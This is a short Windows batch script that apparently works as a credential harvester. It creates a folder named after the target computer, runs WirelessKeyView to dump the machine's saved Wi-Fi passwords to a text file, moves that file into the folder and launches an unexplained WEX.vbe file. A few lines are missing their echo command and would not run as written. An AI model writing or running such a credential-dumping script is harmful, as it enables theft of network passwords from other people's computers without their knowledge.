@echo off
mode 50,6
color a
goto I
:emptyoption
echo.
echo Computer name cannot be empty.
pause>nul
goto I
cls
:I
echo What's the computer name? (Folder Name)
set /p namecomputer=
if "%namecomputer%" EQU "" (goto emptyoption)
md %namecomputer%
start WirelessKeyView.exe /stext WifiPasswords.txt
cls
Extraying.
timeout /t 1 /nobreak > nul
cls
Extraying..
timeout /t 1 /nobreak > nul
cls
Extraying...
timeout /t 1 /nobreak > nul
move "WifiPasswords.txt" %namecomputer%
start WEX.vbe
cls
exit